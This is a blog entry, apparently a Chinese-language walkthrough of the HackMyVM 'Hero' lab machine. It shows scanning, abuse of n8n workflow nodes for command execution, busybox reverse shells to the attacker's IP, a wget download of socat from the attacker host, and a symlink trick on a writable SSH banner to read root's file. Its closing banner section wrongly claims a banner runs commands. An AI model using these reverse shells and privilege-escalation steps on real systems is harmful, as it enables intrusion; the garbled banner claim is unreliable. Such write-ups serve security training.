<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hero</title>
    <link href="/hackmyvm/Hero/"/>
    <url>/hackmyvm/Hero/</url>
    
    <content type="html"><![CDATA[<h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>下载地址：<a href="https://downloads.hackmyvm.eu/hero.zip">https://downloads.hackmyvm.eu/hero.zip</a></li><li>难度：easy</li></ul><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00015s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00019s latency).<br>MAC Address: 08:00:27:40:3A:6A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00065s latency).<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.03 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.9 -oA nmapscan/ports               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.0050s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>5678/tcp open  rrac<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.92 seconds<br></code></pre></td></tr></table></figure><p>开放端口80 和5678<br>（2）对端口细节进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p80,5678 192.168.2.9 -oA nmapscan/detail  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00045s latency).<br><br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    nginx<br>5678/tcp open  rrac?<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5678-TCP:V=7.94SVN%I=7%D=2/7%Time=67A606D3%P=x86_64-pc-linux-gnu%r(<br>SF:GetRequest,8DC,HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCa<br>SF:che-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Fri,\x200<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.75 seconds<br><br></code></pre></td></tr></table></figure><p>（3）进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p80,5678 192.168.2.9 -oA nmapscan/udp  <br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00057s latency).<br><br>PORT     STATE  SERVICE<br>80/udp   closed http<br>5678/udp closed rrac<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.21 seconds<br></code></pre></td></tr></table></figure><p>（4）进行漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,5678 192.168.2.9 -oA nmapscan/vuln         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00030s latency).<br><br>PORT     STATE  SERVICE<br>22/tcp   closed ssh<br>80/tcp   open   http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-vuln-cve2011-3192: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Apache byterange filter DoS</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  BID:49303  CVE:CVE-2011-3192</span><br><span class="hljs-string">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="hljs-string">|       overlapping byte ranges are requested.</span><br><span class="hljs-string">|     Disclosure date: 2011-08-19</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/49303</span><br><span class="hljs-string">|_      https://www.tenable.com/plugins/nessus/55976</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">5678/tcp open   rrac</span><br><span class="hljs-string">MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 73.60 seconds</span><br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，发现是<code>ssh</code>的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L<br>UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg<br>AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75<br>BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><ul><li>将私钥保存到文件<code>id_rsa</code>中<br>（2）从私钥中提取公钥<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ ssh-keygen -y -f id_rsa             <br>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero<br></code></pre></td></tr></table></figure></li><li>找到ssh登录的用户名是<code>shawa</code><br>（3）对80端口进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.9<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 399]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure></li><li>未发现其他的目录，渗透基本结束</li></ul><h2 id="5678端口渗透"><a href="#5678端口渗透" class="headerlink" title="5678端口渗透"></a>5678端口渗透</h2><p>（1）访问页面发现是<code>n8n</code>，一个工作流自动化平台，按照提示进行注册和登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072146175.png"></p><ul><li>成功进入页面<br>（2）对5678端口进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.9:5678 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.9:5678<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 1975]<br>/static               (Status: 301) [Size: 156] [--&gt; /static/]<br>/assets               (Status: 301) [Size: 156] [--&gt; /assets/]<br>/types                (Status: 301) [Size: 155] [--&gt; /types/]<br>Progress: 650365 / 830576 (78.30%)^C<br>[!] Keyboard interrupt detected, terminating.<br>Progress: 650454 / 830576 (78.31%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure></li><li>未发现有用的目录</li></ul><h2 id="n8n渗透"><a href="#n8n渗透" class="headerlink" title="n8n渗透"></a>n8n渗透</h2><p>（1）在 Overview 里面找到 Credentials ，新增 shawa 账号和刚才的 key 。IP 注意不能是 localhost 或者 127.0.0.1，因为是在Docker 里面，使用<code>172.17.0.1</code><br>    为什么是<code>172.17.0.1</code>？<br>    在Workflow 里面创建一个 Workflow ，节点选<code>Execute Command</code>，就可以进行命令执行，执行命令<code>ifconfig</code>，就可以知道靶机所在的IP是172的。<br>    同时在节点<code>Execute Command</code>执行反弹shell后，获取到的<code>id</code>是<code>node</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072154216.png"></p><ul><li>提示Connection tested successfully ，就说明成功啦<br>（2）在Workflow 里面创建一个 Workflow ，节点选 SSH，就可以 Test 命令了，随便试了两个命令都能正常执行<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072157384.png"><br>（3）反弹shell<br>尝试bash反弹，发现没有找到bash，说明没有bash；经过尝试发现可以使用busybox进行反弹shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">busybox  nc 192.168.2.4 4444 -e /bin/sh <br></code></pre></td></tr></table></figure>成功进行反弹<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.9] 37397<br><span class="hljs-built_in">id</span><br>uid=1000(shawa) gid=1000(shawa) <span class="hljs-built_in">groups</span>=1000(shawa)<br></code></pre></td></tr></table></figure></li></ul><h1 id="建立稳定的shell"><a href="#建立稳定的shell" class="headerlink" title="建立稳定的shell"></a>建立稳定的shell</h1><p>成功进行反弹后，发现所获得的shell并不是一个稳定的shell，所以需要使用建立一个稳定的shell<br>（1）使用socat将22端口反弹到2222端口<br>kali上开启web服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0.0.0.0 80<br></code></pre></td></tr></table></figure><p>shell中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/shawa<br>wget 192.168.2.4/socat<br>chomd +x socat<br>./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &amp;<br></code></pre></td></tr></table></figure><p>（2）使用ssh登录，获得稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ ssh shawa@192.168.2.9 -i id_rsa -p 2222 <br>The authenticity of host <span class="hljs-string">&#x27;[192.168.2.9]:2222 ([192.168.2.9]:2222)&#x27;</span> can<span class="hljs-string">&#x27;t be established.&#x27;</span><br>ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.<br>This host key is known by the following other names/addresses:<br>    ~/.ssh/known_hosts:3: [hashed name]<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no/[fingerprint])? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;[192.168.2.9]:2222&#x27;</span> (ED25519) to the list of known hosts.<br>shawa was here.<br>Welcome to Alpine!<br><br>The Alpine Wiki contains a large amount of how-to guides and general<br>information about administrating Alpine systems.<br>See &lt;https://wiki.alpinelinux.org/&gt;.<br><br>You can setup the system with the <span class="hljs-built_in">command</span>: setup-alpine<br><br>You may change this message by editing /etc/motd.<br><br>hero:~$ <span class="hljs-built_in">cat</span> user.txt<br>HMVOHIMNOTREAL<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>（1）查看<code>sshd_config</code>，发现<code>Banner /opt/banner.txt</code>，进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ <span class="hljs-built_in">cat</span> /opt/banner.txt <br>shawa was here.<br>hero:~$ <span class="hljs-built_in">ls</span> -la /opt/banner.txt <br>-rw-rw-rw-    1 root     root            16 Feb  6 10:09 /opt/banner.txt<br></code></pre></td></tr></table></figure><p>发现该文件是以<code>root</code>权限进行读写的<br>（2）使用软链接进行提权，将<code>/root/root.tx</code>中的内容写入到<code>banner.txt</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ <span class="hljs-built_in">rm</span> -rf /opt/*<br>hero:~$ <span class="hljs-built_in">ln</span> -s /root/root.txt /opt/banner.txt<br></code></pre></td></tr></table></figure><p>（3）使用<code>root</code>登录ssh，即可读取<code>/root/root.txt</code>中的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ ssh root@172.17.0.1<br>The authenticity of host <span class="hljs-string">&#x27;172.17.0.1 (172.17.0.1)&#x27;</span> cant be established.<br>ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no/[fingerprint])? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;172.17.0.1&#x27;</span> (ED25519) to the list of known hosts.<br>HMVNOTINPRODLOL<br>root@172.17.0.1<span class="hljs-string">&#x27;s password: </span><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="SSH如何从私钥中提取公钥"><a href="#SSH如何从私钥中提取公钥" class="headerlink" title="SSH如何从私钥中提取公钥"></a>SSH如何从私钥中提取公钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -y -f 私钥文件名<br></code></pre></td></tr></table></figure><ul><li>**<code>ssh-keygen</code>**：这是生成、管理和转换 SSH 密钥的工具。  </li><li>**<code>-y</code>**：该选项指示 <code>ssh-keygen</code> 从私钥文件中提取公钥。</li><li>**<code>-f id_rsa</code>**：指定私钥文件的路径，这里假设私钥文件名为 <code>id_rsa</code>。</li></ul><h2 id="n8n渗透-1"><a href="#n8n渗透-1" class="headerlink" title="n8n渗透"></a>n8n渗透</h2><p>n8n介绍：<a href="https://github.com/n8n-io/n8n">https://github.com/n8n-io/n8n</a><br>在n8n中<code>workflow</code>里面的工作流，节点<code>ssh</code>可以进行命令执行，但是需要在<code>credentials</code>创建<code>ssh private key account</code>，需要知道相关的<code>username</code>和<code>private key</code><br>同时还有一个节点<code>Execute Command</code>也可以进行命令执行，不需要任何的参数</p><h2 id="busyfox反弹shell"><a href="#busyfox反弹shell" class="headerlink" title="busyfox反弹shell"></a>busyfox反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">busyfox nc &lt;攻击者IP&gt; 4444 -e /bin/sh<br>busyfox /bin/sh -i &gt; /dev/tcp/&lt;攻击者IP&gt;/4444 0&lt;&amp;1 2&gt;&amp;1<br>busyfox telnet &lt;攻击者IP&gt; 4444 | /bin/sh | telnet &lt;攻击者IP&gt; 4445<br></code></pre></td></tr></table></figure><h2 id="如何通过-Banner-读取-root-权限的文件"><a href="#如何通过-Banner-读取-root-权限的文件" class="headerlink" title="如何通过 Banner 读取 root 权限的文件"></a>如何通过 <code>Banner</code> 读取 root 权限的文件</h2><p><code>Banner</code> 是一个用于设置自定义登录横幅（Login Banner）的选项。当用户成功连接到 SSH 服务器但尚未登录时，服务器会显示这个横幅信息。<br>存在于配置文件<code>sshd_config</code>中</p><p>如果你确实需要通过 <code>Banner</code> 读取 root 权限的文件（例如用于测试或调试），可以按照以下步骤操作：</p><h4 id="步骤-1：创建-Banner-文件"><a href="#步骤-1：创建-Banner-文件" class="headerlink" title="步骤 1：创建 Banner 文件"></a><strong>步骤 1：创建 Banner 文件</strong></h4><ul><li>创建一个 Banner 文件（如 <code>/etc/ssh/banner.txt</code>）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/ssh/banner.txt<br></code></pre></td></tr></table></figure></li><li>在文件中添加以下内容，使用 <code>cat</code> 命令读取目标文件（如 <code>/etc/shadow</code>）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-2：修改-sshd-config"><a href="#步骤-2：修改-sshd-config" class="headerlink" title="步骤 2：修改 sshd_config"></a><strong>步骤 2：修改 <code>sshd_config</code></strong></h4><ul><li>打开 SSH 配置文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure></li><li>添加或修改 <code>Banner</code> 选项，指向刚刚创建的文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Banner /etc/ssh/banner.txt<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-3：重启-SSH-服务"><a href="#步骤-3：重启-SSH-服务" class="headerlink" title="步骤 3：重启 SSH 服务"></a><strong>步骤 3：重启 SSH 服务</strong></h4><ul><li>重启 SSH 服务以使配置生效：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart sshd<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-4：测试连接"><a href="#步骤-4：测试连接" class="headerlink" title="步骤 4：测试连接"></a><strong>步骤 4：测试连接</strong></h4><ul><li>使用 SSH 客户端连接到服务器：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh user@your_server_ip<br></code></pre></td></tr></table></figure></li><li>如果配置正确，连接时会显示目标文件的内容（如 <code>/etc/shadow</code>）。</li></ul>]]></content>
    
    
    <categories>
      
      <category>hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>n8n</tag>
      
      <tag>Banner</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
